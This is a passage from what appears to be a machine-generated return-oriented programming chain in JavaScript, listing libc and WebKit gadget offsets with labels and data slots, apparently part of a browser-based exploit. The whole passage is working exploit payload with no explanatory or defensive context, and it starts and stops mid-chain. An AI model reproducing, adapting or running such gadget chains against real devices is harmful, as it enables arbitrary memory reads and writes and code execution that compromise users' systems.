libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+77416, //L285
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+77544, //L288
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+77560, //L289
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+77528, //L287
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L287:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L288:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L289:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+77720, //L293
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+77688, //L291
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+77704, //L292
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L290:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L291:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L292:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+77776, //L294
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+77904, //L297
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+77920, //L298
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+77888, //L296
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L296:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L297:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+78000, //L299
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+78016, //L300
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L299:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+78120, //L302
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+78136, //L303
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L301:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+772328,); //pop rcx
//L302:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L303:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L305:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+78280, //L308
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+78264, //L307
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L307:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L308:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+78424, //L312
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+78392, //L310
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+78408, //L311
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L310:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L311:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L312:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+78496, //L313
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L313:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+78552, //L315
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L315:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+78648, //L318
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L317:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L318:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+78752, //L321
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+78736, //L320
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L320:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L321:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+78912, //L324
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+78944, //L326
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+78896, //L323
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+78928, //L325
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L323:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L324:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L325:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L326:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+79056, //L327
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+79088, //L329
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+79072, //L328
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L327:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L328:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+79176, //L330
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+79232, //L332
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L332:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+79376, //L335
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+79392, //L336
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+79360, //L334
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L334:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L335:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229136, //mov al, [rdi]
libc_base+713278, //pop rsi
ropchain+79552, //L340
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+79520, //L338
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+79536, //L339
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L337:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L338:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L339:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+79608, //L341
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L341:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+79736, //L344
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+79752, //L345
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+79720, //L343
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L343:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L344:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+79912, //L349
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+79880, //L347
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+79896, //L348
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L346:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L347:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L348:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+79968, //L350
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+80096, //L353
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+80112, //L354
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+80080, //L352
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L352:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L353:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+80272, //L358
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+80240, //L356
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+80256, //L357
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L355:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L356:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L357:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+80328, //L359
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L359:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+80456, //L362
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+80472, //L363
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+80440, //L361
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L361:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L362:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+80552, //L364
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+80568, //L365
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L364:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L365:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+80728, //L369
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+80696, //L367
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+80712, //L368
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L366:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L367:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L368:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+80784, //L370
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L370:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+80912, //L373
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+80928, //L374
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+80896, //L372
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L372:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L373:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+81024, //L376
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+81008, //L375
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L375:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L376:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+81120, //L378
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L377:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L378:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+81224, //L381
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+81208, //L380
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L380:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+81368, //L385
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+81336, //L383
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+81352, //L384
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L383:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L384:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L385:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+81440, //L386
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L386:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+81496, //L388
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L388:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L390:
db([7, 0]); // 0x7
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+81640, //L392
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L391:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L392:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+81744, //L395
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+81728, //L394
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L394:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L395:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+81904, //L398
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+81936, //L400
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+81888, //L397
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+81920, //L399
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L397:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L398:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L399:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+82048, //L401
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+82080, //L403
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+82064, //L402
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L401:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L402:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+82192, //L404
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+82208, //L405
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L404:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+82296, //L406
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+82352, //L408
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L408:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+82424, //L410
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L410:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+82480, //L412
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L412:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+82584, //L415
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L414:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+772328,); //pop rcx
//L415:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+82688, //L418
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+82672, //L417
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L417:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L418:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229136, //mov al, [rdi]
libc_base+713278, //pop rsi
ropchain+82848, //L423
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+82816, //L421
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+82832, //L422
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L420:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L421:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L422:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+82904, //L424
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+83032, //L427
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+83048, //L428
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+83016, //L426
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L426:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L427:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L428:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+83208, //L432
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+83176, //L430
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+83192, //L431
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L429:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L430:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L431:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+83264, //L433
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+83392, //L436
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+83408, //L437
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+83376, //L435
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L435:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L436:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L437:
